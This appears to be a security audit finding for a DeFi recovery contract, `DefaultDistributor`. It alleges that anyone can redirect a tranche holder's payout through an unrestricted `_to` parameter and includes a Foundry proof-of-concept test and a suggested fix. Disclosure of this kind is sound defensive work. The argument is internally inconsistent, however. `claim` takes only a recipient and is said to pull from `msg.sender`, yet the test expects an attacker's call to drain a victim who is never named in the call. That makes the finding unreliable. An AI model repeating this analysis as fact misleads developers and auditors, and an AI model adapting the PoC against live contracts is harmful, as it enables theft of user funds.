### Title
Unprivileged caller can redirect a tranche holder’s entire recovery payout - (File: `contracts/DefaultDistributor.sol`)

### Summary
`DefaultDistributor.claim` authorizes the payout based on `msg.sender`’s tranche-token allowance but sends the underlying recovery funds to an unrestricted `_to` parameter. Any attacker can therefore front-run an approved holder’s claim and receive the holder’s entire proportional distribution. [1](#0-0) 

### Finding Description
When claims are active, `claim` reads the caller-supplied victim’s full tranche balance, pulls that entire balance through `transferFrom`, and transfers `trancheBal * rate / ONE_TRANCHE` underlying tokens to arbitrary address `_to`. [1](#0-0) 

The required approval is part of the intended claim flow, so it does not protect the payout destination: the repository’s own test first approves the distributor and then calls `claim`. [2](#0-1) 

Once the honest owner funds the distributor and activates it, `rate` is fixed from the distributor balance divided by total tranche supply. [3](#0-2)  An attacker observing a victim’s approval can call `claim(attacker)` using the victim’s approval and take the full payout rather than merely the attacker’s own entitlement.

### Impact Explanation
This is direct theft of defaulted-tranche recovery funds. The victim loses their entire claim entitlement represented by their tranche balance, while the attacker only pays transaction gas and does not need to own tranche tokens or hold any privileged role. [1](#0-0) 

For example, if the distributor holds 200 USDC and the victim owns all 100 tranche tokens, the attack transfers the entire 200 USDC entitlement to the attacker after the victim approves the distributor. [4](#0-3) 

### Likelihood Explanation
The exploit only requires the distributor to be active and the victim to have an outstanding allowance, both of which are normal preconditions for claiming. Because approval and claiming are separate public transactions unless deliberately batched, an attacker can monitor the mempool or exploit stale approvals. [2](#0-1) 

### Recommendation
Bind the payout destination to the authenticated tranche owner by removing the `_to` parameter and transferring proceeds to `msg.sender`, or require `_to == msg.sender`. [1](#0-0)  If claiming to a different beneficiary is required, use a signed authorization or permit-style flow that binds the owner, recipient, amount, distributor, chain, and deadline.

### Proof of Concept
Add this test to `test/foundry/DefaultDistributor.t.sol`; its existing `setUp` forks Ethereum mainnet at block `16527983`. [5](#0-4) 

```solidity
function testClaimPayoutCanBeRedirectedByAnyone() external {
    address victim = address(1);
    address attacker = address(0xbeef);

    uint256 trancheAmount = 100 * 1e18;
    uint256 recoveryAmount = 200 * 1e6;

    IdleCDOTranche(address(tranche)).mint(victim, trancheAmount);

    distributor = new DefaultDistributor(
        address(underlying),
        address(tranche),
        address(this)
    );

    // Honest owner funds and activates recovery distribution.
    deal(address(underlying), address(distributor), recoveryAmount);
    distributor.setIsActive(true);
    assertEq(distributor.rate(), 2 * 1e6);

    // Victim grants the allowance required for a normal claim.
    vm.prank(victim);
    tranche.approve(address(distributor), trancheAmount);

    uint256 attackerBalanceBefore = underlying.balanceOf(attacker);

    // Unprivileged attacker consumes the victim's allowance and chooses itself.
    vm.prank(attacker);
    distributor.claim(attacker);

    assertEq(
        underlying.balanceOf(attacker) - attackerBalanceBefore,
        recoveryAmount,
        "attacker received victim's full recovery payout"
    );
    assertEq(tranche.balanceOf(victim), 0, "victim tranches were pulled");
    assertEq(
        tranche.balanceOf(address(distributor)),
        trancheAmount,
        "distributor retained claimed tranches"
    );
}
```

